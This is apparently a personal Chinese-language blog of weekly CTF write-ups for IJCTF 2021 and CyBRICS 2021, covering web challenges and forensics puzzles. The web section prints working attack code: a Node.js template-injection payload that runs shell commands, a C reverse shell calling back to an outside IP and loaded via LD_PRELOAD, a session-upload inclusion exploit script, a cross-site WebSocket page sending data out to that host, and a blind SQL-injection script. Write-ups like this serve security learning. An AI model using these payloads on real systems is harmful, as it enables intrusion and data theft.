---
butterId: var // blog image bucket id [Don't remove]
---

# Week7 Summary

## What have I done

- 7th XCTF & CyBRICS CTF 2021 整理复现中
- IJCTF 2021 整理复现中

## [WriteUp] How did I accomplish these things

### Web

#### [IJCTF 2021] SodaFactory

> Welcome to my SodaFactory.
>
> Note: You don't need any bruteforce
>
> Author: TheGrandPew#0740

使用的库是 sodajs，从以下代码看出参数 name 未经处理就传入了，在渲染后输出。

```javascript
app.post('/makeSoda', (req, res) => {
  var {name, brand} = req.body;
  img = images[brand];
  res.send(soda(`
    <title>${name}</title>
    <img src='${img}' alt='${name}'>
  `,{}))
})
```

因此对参数 name 尝试 SSTI，构造 `{{1 + 1}}` 可以发现输出的是 2，因此判定存在模板注入。使用如下载荷一把梭读出环境变量找到 flag。

> https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

```javascript
{{ " ".toString.constructor("return global.process.mainModule.constructor._load('child_process').execSync('env').toString()")() }}
```

读出如下环境变量。

```plain text
NODE_VERSION=12.18.1
HOSTNAME=53d556edba99
YARN_VERSION=1.22.4
PORT=3000
HOME=/root
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PWD=/app
FLAG=IJCTF{Y00_maK3_g00D_50DA_MA73}
```

```flag
IJCTF{Y00_maK3_g00D_50DA_MA73}
```

#### [IJCTF 2021] Memory

> Do you remember the past? You lived hard. Now, you need to take some rest by remembering your past.
>
> Run `/flag`
>
> Note: You don't need any bruteforce. The provided `phpinfo` has all the information for solving this challenge. So, I'll not provide Dockerfile of this challenge.
>
> Author:`sqrtrev#9113`

题目的附件中给出了如下两端代码和一个 PHPINFO 文件。

```php
//index.php
<?php
include 'filter.php';

$r = function($errorno, $errstr, $errfile, $errline) {error_log("[$errorno] $errstr", 0);};
set_error_handler(function() use(&$r){ $r = True; });

if(!isset($_GET['mode'])){
    echo "Welcome!!";
}else if($_GET['mode'] == "chance"){
    if(strlen($_GET['chance']) > 15 | filter($_GET['chance'],1) | checkLetterNums($_GET['chance'])) exit("No Hack T.T");
    eval($_GET['chance']);
}

if(isset($_GET['bonus'])){
    if(strlen($_GET['bonus']) > 32 | filter($_GET['bonus'])) exit("No bonus ~.~");
    include $_GET['bonus'];
}

?>
```

```php
//filter.php
<?php

function filter($var, $case = 0): bool{
    $banned = ["\$_", "eval", "include", "require", "?", ":", "^", "+", "-", "%", "*"];

    foreach($banned as $ban){
        if(strstr($var, $ban)) return True;
    }

    if($case){
        $additional = ["php","/"];
        foreach($additional as $ban){
            if(strstr($var, $ban)) return True;
        }
    }

    return False;
}

function checkLetterNums($var): bool{
    $alphanum = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $cnt = 0;
    for($i = 0; $i < strlen($alphanum); $i++){
        for($j = 0; $j < strlen($var); $j++){
            if($var[$j] == $alphanum[$i]){
                $cnt += 1;
                if($cnt > 4) return True;
            }
        }
    }
    return False;
}
```

当参数 mode 为 chance 的时候会进行经过严格过滤的指令执行，而 mode 为 bonus 的时候则会进行 include。给出的 PHPINFO 文件中 disable_function 几乎禁用了所有的函数，加上过滤极为严格，因此直接指令执行是不可能的。可以注意到 `session.upload_progress.cleanup`  的值为 Off，也就是说当 POST 文件上传后 session 不会被清理，`session.use_strict_mode` 的值为 0。这意味着自定义一个会话 ID，进而可以利用 PHP_SESSION_UPLOAD_PROGRESS 进行文件包含。上传到 `/tmp` 的文件会在进程结束后被删除，因此需要写出 `for(;;){}` 来阻塞执行进程。

##### 反弹 shell 的构造

可以发现在 PHPINFO 文件中，`putenv` 和 `mail` 两个函数都还能使用，因此尝试写入 LD_PRELOAD，使用 `mail` 函数来触发一个反弹 shell。构造出如下反弹 shell 的代码。

```c
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <errno.h>

void payload() {
    struct sockaddr_in serveraddr;
        int server_sockfd;
        int client_len;
        char buf[80],rbuf[80], *cmdBuf[2]={"/bin/sh",(char *)0};

        server_sockfd = socket(AF_INET, SOCK_STREAM, 6);
        serveraddr.sin_family = AF_INET;
        serveraddr.sin_addr.s_addr = inet_addr("8.136.8.210"); 
        serveraddr.sin_port = htons(atoi("3255"));
        client_len = sizeof(serveraddr);

        connect(server_sockfd, (struct sockaddr*)&serveraddr, client_len);

        dup2(server_sockfd, 0);
        dup2(server_sockfd, 1);
        dup2(server_sockfd, 2);

        execve("/bin/sh",cmdBuf,0);
}   

uid_t getuid() {
    if (getenv("LD_PRELOAD") == NULL) { return 0; }
    unsetenv("LD_PRELOAD");
    payload();
}
```

使用如下指令进行编译。

```bash
$ gcc -c -fPIC shell.c -o shell
$ gcc -shared shell -o shell.so
```

编译完成的二进制文件即可用于反弹 shell。再构造出如下 PHP 文件用于进行 LD_PRELOAD 进而触发反弹 shell。

```php
<?php
    putenv("LD_PRELOAD=./shell.so"); //此处的文件名还需要更改
    mail('','','','');
?>
```

写出如下脚本来一把梭触发反弹 shell。

```php
<?php

use GuzzleHttp\Client;
use GuzzleHttp\Psr7;

ini_set('session.serialize_handler', 'php_serialize');

require '../vendor/autoload.php';


// Exploit
$URL = "http://8.136.8.210:10030";
$client = new Client(array(
    "base_uri" => $URL,
    "allow_redirects" => false,
    "timeout" => 3.0
));
try{
    $client->post("/", array(
        "query" => array(
            "chance" => "for(;;){}",
            "mode" => "chance"
        ),
        "multipart" => array(
            array(
                "name" => "PHP_SESSION_UPLOAD_PROGRESS",
                "contents" => "N"
            ),
            array(
                "name" => "file",
                "contents" => Psr7\Utils::tryFopen("./shell.so", "rb"),
                "filename" => "shell.so"
            )
        ),
        "headers" => array(
            "Cookie" => "PHPSESSID=exp1;"
        )
    ));
}catch(Exception $e){
}

$response = $client->get("/", array(
    "query" => array(
        "bonus" => "/var/lib/php/sessions/sess_exp1"
    )
));
$content = $response->getBody()->getContents();
$content = str_replace("Welcome!!upload_progress_N|", "", $content);
$tmpLibName = unserialize($content)["files"][0]["tmp_name"];
echo $tmpLibName;

try{
    $client->post("/", array(
        "query" => array(
            "chance" => 'for(;;){}',
            "mode" => "chance"
        ),
        "multipart" => array(
            array(
                "name" => "PHP_SESSION_UPLOAD_PROGRESS",
                "contents" => "<?php putenv(\"LD_PRELOAD=$tmpLibName\"); mail(\"\", \"\", \"\", \"\"); ?>"
            ),
            array(
                "name" => "file",
                "contents" => "none",
                "filename" => "none.so"
            )
        ),
        "headers" => array(
            "Cookie" => "PHPSESSID=exp2;"
        )
    ));
}catch(Exception $e){
}

try{
    $response = $client->get("/", array(
        "query" => array(
            "bonus" => "/var/lib/php/sessions/sess_exp2"
        )
    ));
}catch(Exception $e){
}
```

拿到 shell 后执行根目录下的 flag 文件即可得到 flag。

```flag
ijctf{the_memories_from_the_past}
```

#### [CyBRICS 2021] Ad Network

> Author: Alexander Menshchikov ([@n0str](https://t.me/n0str))
>
> We are so tired of advertising on the internet. It feels like it breaks the internet. Try to follow the ad, try to follow its rules.
>
> There is a flag 1337 redirects deep into the network...

`/adnetwork` 下有重定向，次数大概为 1337 次，构造出如下脚本来获得 flag。

```php
<?php

use GuzzleHttp\Client;

require '../vendor/autoload.php';
$URL = "http://adnetwork-cybrics2021.ctf.su/adnetwork";

$client = new Client(array(
    "timeout" => 15,
    "allow_redirects" => false,
    "verify" => false
));

for($i = 0; $i < 1338; $i++){
    try{
        $response = $client->get($URL, array(
            'proxy' => array(
                'http' => '127.0.0.1:7890',
                'https' => '127.0.0.1:7890'
            )
        ));
    }catch(Exception $e){
        echo "[i--] $e";
        $i--;
        continue;
    }
    $content = $response->getBody()->getContents();
    $URL = str_replace("\">See Other</a>.\n\n", "", str_replace("<a href=\"", "", $content));
    echo "[$i] " . $URL . PHP_EOL;
    echo $content . PHP_EOL;
}
```

```flag
cybrics{f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z}
```

#### [CyBRICS 2021] Multichat

> Author: Alexander Menshchikov ([@n0str](https://t.me/n0str))
>
> Yet another chat-messenger with rooms support! Free to use. Convince the admin that its code is insecure.
>
> Tip: Admin and tech support are members of a secret chat room. Tech support can ask admin to tell him the flag, to do that tech support writes him a message (in a chat): "`Hey, i forgot the flag. Can you remind me?`". Then admin will tell him the flag.

基于 WebSocket 的聊天室，根据题目描述，只需要技术员向管理员发送指定字符串即可接收到 flag。在 5000 端口给了一个上报 URL 的页面。因此，只需要构建一个前端页面进行 CSRF 即可。

```html
<!DOCTYPE html>
<html>
    <body>
        <script>
            const socket = new WebSocket("ws://multichat-cybrics2021.ctf.su/ws");

            socket.onopen = function(e){
                socket.send("Hey, i forgot the flag. Can you remind me?");
            }
            socket.onmessage = function(e){
                var exportFlag = new XMLHttpRequest();
                exportFlag.open('get', 'http://8.136.8.210:3255/flagis-' + window.btoa(e.data));
                exportFlag.send();
            }
        </script>
    </body>
</html>
```

将页面放在自己的服务器上，提交给靶机，可在监听的端口处得到如下响应。

![](https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627146665815106/cc0e33635d5c036ca114db256c8ece558677e3d2.jpg)

将其中带出的信息解码可得如下内容。

```plain text
Sure, dude. The flag is cybrics{Pwn3d_CR055_51t3_W3850CK3t_h1jACK1n9}
```

```flag
cybrics{Pwn3d_CR055_51t3_W3850CK3t_h1jACK1n9}
```

#### [CyBRICS 2021] Announcement

> Author: Alexander Menshchikov (@n0str)
>
> Ladies and gentlemen!
>
> Allow us to introduce a brand new project —
> ⚐ The Flag

在提交的参数中 SQL 注入，其中 `digest` 参数的值需为 `email` 的 MD5。

![](https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627147306218176/cf696473812c358ea52022ff8ccbbc179861027a.png)

写脚本构造报错逻辑进行盲注。

```php
<?php

use GuzzleHttp\Client;

require '../vendor/autoload.php';
$URL = "http://announcement-cybrics2021.ctf.su/";
//$statement = "select database()"; //announcement
//$statement = "select group_concat(table_name) from information_schema.tables where table_schema=database()"; //emails,logs
//$statement = "select group_concat(column_name) from information_schema.columns where table_schema=database()"; //email,id,timestamp,log
$statement = "select group_concat(log) from announcement.logs"; //flag
$text = "";

$client = new Client(array(
    "timeout" => 5,
    "allow_redirects" => false,
    "verify" => false
));

for($count = 1; $count <= 100; $count++){
    $low = 32;
    $high = 126;
    while($low <= $high){
        $mid = (int)(($low + $high) / 2);
        $sql = "' or if((ascii(substr(({$statement}),{$count},1)) > {$mid}),1,cot(0)), NOW()) #";
        $response = $client->post($URL, array(
            'proxy' => array(
                'http' => '127.0.0.1:7890',
                'https' => '127.0.0.1:7890'
            ),
            'form_params' => array(
                "email" => $sql,
                "digest" => md5($sql)
            )
        ));
        $content = $response->getBody()->getContents();
        if(stristr($content, "cot")){
            $high = $mid - 1;
        }else{
            $low = $mid + 1;
        }
    }
    echo $count . PHP_EOL;
    $text .= chr((int)(($high + $low + 1) / 2));
    echo $text . PHP_EOL;
}
```

```flag
cybrics{1N53r7_0ld_900d_5ql}
```

### Forensic

#### [IJCTF 2021] Riddle Joker

> Joker has returned from his imprisonment. Rumour says that he's scheming a new evil operation by implanting several bombs at a local bank. Each of bomb has a tag information that might be a clue for finding Joker's secret.
>
> Author: `Avilia#1337`

将附件中的 PDF 文件用 010 Editor 打开，可以发现在 690 流的地方有一个嵌入文件。

```plain text
78 9C 0B F0 66 66 11 61 66 64 60 60 F0 6C FB 12
B4 5C 22 90 C5 04 C8 D6 00 62 0E 20 4E CB 49 4C
D7 2B A9 28 39 51 29 77 66 1E AF 6A DC E6 3D A7
E7 88 76 0A 88 AD FA 22 BA EC D9 FD D6 FB 79 75
91 1A BF 2A E6 3F 2F BF D0 D3 3C C3 AE 68 95 CD
DA 3B 8D 9F 5E 2E 6A 7F D7 7E FB 41 80 37 23 93
3D 33 2E B3 55 18 20 40 A1 61 4B 23 03 92 4D 5C
0C 0A 60 71 46 06 09 86 86 4B 0C 4B 7D 6A AF 33
A2 D3 01 DE AC 6C 10 35 8C 0C 51 40 3A 0A AC 03
00 B9 35 3B 19
```

将其用 zlib 解压一次可以发现是一个压缩文档，其中包含带密码的 flag.txt。在 PDF 文件中能发现很多 xref，还有 imagemagick 的标识，猜测其中有很多张图片，同时可以发现 Coordinate 的字样，可以发现许多坐标。通过搜索可以发现如下参考文档，使用其中的工具构造如下脚本还原图片。

> https://blog.didierstevens.com/2008/05/07/solving-a-little-pdf-puzzle/
>
> https://blog.didierstevens.com/2021/01/31/new-tool-pdftool-py/

```python
import os
from PIL import Image

image = Image.new("RGB", (500, 500), "white")

for x in range(1, 50):
    os.system(f"python3 pdftool.py iu secret.pdf -s{x} -d > tmp.pdf")
    x, y = os.popen(f"exiftool -Coordinate tmp.pdf").read().split(" ")[-1].strip().split(",")
    print(f"[+] Found {x}, {y} image")
    os.system(f"convert tmp.pdf -colorspace RGB tmp.png") # imagemagick
    smallImage = Image.open("tmp.png")
    image.paste(smallImage, (int(x), int(y)))
    smallImage.close()
image.save("this.png")
```

运行脚本可以得到如下二维码图片。

![](https://api.lemonprefect.cn/image/hdslb/archive/18ff2c8d-887e-4d48-be34-2307c5249467/1627385844898360/411d16e19dfc8033c510d77994c0a67e59a61c02.png@100w)

使用工具读取该二维码内容可得如下信息。

```plain text
The passcode is sup3r__cred3nti4l_p4sscode_3da748
```

使用 `sup3r__cred3nti4l_p4sscode_3da748` 解压压缩文档可得 flag。

```flag
IJCTF{4bbffb87ecc31ba242772ab1f14f569c}
```

#### [IJCTF 2021] Vault

> A robber broke into a our vault in the middle of night. There's an indication that the robber tried to steal some items which are considered as a confidential asset. Could you figured it out?
>
> Flag format: `IJCTF{[a-f0-9]{32}}`
>
> Author: `Avilia#1337`
>
> When incident happened, the attacker got into our `IP over ICMP` tunnel network to access `HTTP/2` web-server with `SSL` enabled
>
> Even so, our captured logs aren't precise enough. Each packet has an unusual timestamp and it's kinda messsy...

##### 流量包处理

根据提示可知流量包中的流量的时间戳有些问题，因此可以使用 Wireshark 自带的工具先对流量进行排序。

```bash
$reordercap log.pcap log_ordered.pcap
```

对排好序的流量包进行分析，可以发现大部分都是 ICMP 流量，还有一些是 IPv4 的数据。对其进行分析可以发现两个 IPv4 中夹杂着一段数据，搜寻之后可以找到一个用于使用 ICMP 进行通讯的工具 Hans。尝试将 Hans 插入的数据删除，恢复原本的结构。

> https://github.com/friedrich/hans

![](https://api.lemonprefect.cn/image/hdslb/archive/18ff2c8d-887e-4d48-be34-2307c5249467/1627393585872788/6d42abe0873a356c246805386df413313aa7304c.png)

> https://www.wireshark.org/docs/man-pages/editcap.html

使用 Wireshark 的 editcap 工具对数据进行编辑，删除 Hans 插入的 33 个字节数据。

```bash
$editcap -C 15:33 .\log_ordered.pcap .\log_processed.pcap
```

打开处理好的流量包，可以发现一些 Socks 和 TCP 流量，根据提示将 Socks 流量重新设置解码为 TLS。跟踪 TCP 流到 0 可以发现传输的 SSL Key Log file。

![](https://api.lemonprefect.cn/image/hdslb/archive/18ff2c8d-887e-4d48-be34-2307c5249467/1627394559649768/b9ac84b81dcff4e6d1cedebd96b2f292301a210d.png)

将其导出后保存为文件，将部分换行符修正为空格，导入到 Wireshark 中解密 TLS 流量。

##### HTTP2 流量的分析

解密的 TLS 流量中有很多含有 data 和 content-range 的数据传输。将 SSL Key Log file 注入进文件中。

```bash
$editcap --inject-secrets tls,sslkeylogfile log_processed.pcap log_decrypted.pcap
```

将流量中含有的 data 和对应部分的 range 取出，使用如下的 CyberChef  Receipt 处理。

```bash
$tshark -r ./log_decrypted.pcap -Y "http2" -T fields -e http2.headers.range -e http2.data.data > data.txt
```

```plain text
Find_/_Replace({'option':'Regex','string':'^(bytes.*)\\n'},'$1',true,false,true,false)
Find_/_Replace({'option':'Regex','string':'\\t\\n|bytes='},'',true,false,true,false)
Find_/_Replace({'option':'Regex','string':'\\t\\t|-'},',',true,false,true,false)
```

将得到的数据使用 Excel 对两位和四位长度的数据分别排序后导出，再 `From Hex` 处理一次可以得到一个字符串 `0edbca2531daefac9c5c84c016792713fd23681ea8bc1b3d088b617f75940313` 和一个压缩包。使用该字符串作为压缩包的密码将其解压可得 flag。

```flag
IJCTF{aa51f2cc8eaf466a277da70db3a3c576}
```

#### [CyBRICS 2021] Scanner

> Author: Mikhail Driagunov (@aethereternity)
>
> Check out this cool new game!
>
> I heard they serve flags at level 5.

依次解出前四个简单关卡。第五关给了一个滚动的二维码。先使用 GIF Splitter 抽帧分离，再写个脚本将其还原出来。

![](https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627192904950265/9d927c64c13d995920d8d9fff41cac5bde5a700f.png@100w)

```python
from PIL import Image

ny = 0
newImage = Image.new("RGB", (989, 162), "white")
for x in range(8, 145, 3):
    print("./gif/IMG00%03d.bmp" % x)
    image = Image.open(("./gif/IMG00%03d.bmp" % x))
    slice = image.crop((46, 496, 1036, 502))
    newImage.paste(slice, (0, ny))
    ny += 6
newImage = newImage.resize((500, 500))
newImage.save("this.png")
```

扫描二维码可得 flag。

```flag
cybrics{N0w_Y0u_4r3_4_c4sh13r_LOL}
```

#### [CyBRICS 2021] CAPTCHA The Flag

> Author: Vlad Roskov ([@mrvos](https://t.me/mrvos))
>
> Guessing challenges? On *my* CyBRICS? It’s more likely than you think.
>
> Prove you’re a true CTFer!

填写验证码的小游戏，要分解颜色才能看见验证码。构造如下交互式脚本来解决问题。

```python
import httpx as requests
import numpy as np
from PIL import Image

# bit planes codes are from https://medium.com/@stephanie.werli/image-steganography-with-python-83381475da57
# Interactive Script

session = requests.Client(proxies={
    "http://": "http://127.0.0.1:7890",
    "https://": "http://127.0.0.1:7890",
})
while True:
    image = session.get("https://captf-cybrics2021.ctf.su/captcha.php").content
    file = open("./tmp.png", "wb")
    file.write(image)
    file.close()

    data = np.array(Image.open("./tmp.png", "r"))
    out = []
    for k in range(7, -1, -1):
        res = data // 2 ** k & 1
        out.append(res * 255)
    b = np.hstack(out)
    Image.fromarray(b).show()

    captcha = input("Enter the captcha you have seen in the window:")
    try:
        response = session.post("https://captf-cybrics2021.ctf.su/", data={"answer": f"{captcha}"})
    except:
        print(f"[*] Hand up failed.")
        continue
    print(f"[+] Handed up {captcha} with response {response.content.decode()}")
```

![](https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627200498307069/fffe6eca797af1a13937dc3b4910cd55a59909e6.png)

```flag
cybrics{a_k33n_Ey3_wi11_sp0T_r1GhT_aw4Y}
```

#### [CyBRICS 2021] Namecheck

> Author: Alexander Menshchikov ([@n0str](https://t.me/n0str))
>
> We have got the home folder from a criminal’s computer. Try to find his/her real name.
>
> Flag format in uppercase: LASTNAME FIRSTNAME (ex: IVANOV IVAN)

附件中有一份 Bash history。

```plain text
git add *
git commit -m "instagram filter"
git push origin main
rm *
ls -la
rm -rf .git
```

.ssh 文件夹中还有一份私钥，因此尝试使用这个私钥去连接 GitHub，可以得到如下响应。

```plain text
PTY allocation request failed on channel 0
Hi poggersdog12! You've successfully authenticated, but GitHub does not provide shell access.
Connection to github.com closed.
```

因此得到了此人的 GitHub ID `poggersdog12`。

> https://gist.github.com/thewoolleyman/2294542455a8e673e0a844362e0b8bac#file-github-graphql-commits-by-ref

使用上述参考 GraphQL 语句略作修改可以查出一个 email `vividcoala@localhost.com`。

![](https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627218434788759/be78679f4557c7b6405a3484302ebba51763e910.png)

根据前面的 commit 信息可知有一个 Instagram，因此尝试访问 vividcoala 的 Instagram，在 filter 中可以发现一张机票，使用 Read My Boarding Pass 扫描可得如下内容。

![](https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627220136652090/57e3d4f7fcbae997691bb97380bb8c488abe4baf.png@550h_500w_1c)

```flag
DIVOV NIKOLAI
```

## Summary

太菜了还没复现好，正在加油冲了。
